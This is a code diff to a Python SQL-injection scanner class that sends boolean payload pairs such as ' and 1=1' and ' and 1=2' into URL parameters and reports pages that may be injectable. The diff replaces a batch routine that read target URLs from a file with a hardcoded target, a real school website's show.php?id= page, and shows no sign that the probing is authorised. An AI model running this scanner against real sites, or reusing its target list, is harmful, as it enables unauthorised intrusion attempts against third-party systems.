@@ -15,6 +15,10 @@ class Sql:
         self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
         self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
 
+    def init(self):
+        if not self.target.startswith('http://') and not self.target.startswith('https://'):
+            self.target = 'http://' + self.target
+
     @staticmethod
     def _conn(url):
         try:
@@ -93,31 +97,15 @@ class Sql:
             return False
 
     def run(self):
-        print("\n# 检测SQL注入:")
         results = []
         for target in self.targets:
             self.target = target
+            self.init()
             result = self._scan()
             if result:
                 print('可能存在注入:' + result)
                 results.append(result)
         return results
 
-
-def main():
-    targets = []
-    with open('baidu/2.txt', 'r') as file:
-        with open('sql/1.txt', 'a+') as sql_file:
-            for url in file:
-                targets.append(url.strip())
-            try:
-                s = Sql(targets)
-                _targets = s.run()
-                for target in _targets:
-                    sql_file.write(target + '\n')
-            except Exception as e:
-                print(e)
-
-
 if __name__ == '__main__':
-    main()
+    Sql(['http://nhez.nh.edu.sh.cn/xwgf/show.php?id=4479']).run()
